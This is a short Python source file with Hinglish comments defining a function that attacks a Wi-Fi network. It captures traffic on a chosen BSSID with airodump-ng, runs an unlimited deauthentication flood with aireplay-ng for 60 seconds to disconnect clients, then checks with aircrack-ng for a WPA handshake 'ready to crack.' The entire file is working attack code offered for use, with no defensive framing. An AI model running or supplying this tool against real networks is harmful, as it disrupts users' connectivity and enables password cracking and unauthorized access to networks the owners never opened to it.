import subprocess
import os
import time

def launch_attack(bssid, channel, interface='wlan0mon'):
    try:
        capture_file = "/tmp/awb_attack"
        
        # Purani files delete karo
        for ext in ["-01.cap", "-01.csv", "-01.kismet.csv"]:
            if os.path.exists(capture_file + ext):
                os.remove(capture_file + ext)
            
        # 1. airodump-ng ko 60 seconds ke liye start karo
        airodump = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', capture_file, interface], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(3) # airodump ko channel set hone do
        
        # 2. Infinite Deauth Attack (-0 0) background mein start karo
        # Ye tab tak chalta rahega jab tak hum ise kill nahi karte
        aireplay = subprocess.Popen(['aireplay-ng', '-0', '0', '-a', bssid, interface], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        log_to_terminal = f"Launched continuous Deauth on {bssid}. Capturing for 60 seconds..."
        
        # 60 seconds tak capture hone do
        time.sleep(60)
        
        # Dono processes ko band karo
        aireplay.terminate()
        airodump.terminate()
        airodump.wait()
        time.sleep(2) # File save hone do
        
        cap_file_path = capture_file + "-01.cap"
        if not os.path.exists(cap_file_path):
            return {"status": "error", "message": "Attack failed. Capture file not generated."}
        
        # 3. Handshake Verify Karna (aircrack-ng se)
        verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
        output = verify.stdout
        
        if "1 handshake" in output:
            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack.", "cap_file": cap_file_path}
        else:
            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Target might be offline or not reconnecting. Try again.", "cap_file": cap_file_path}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}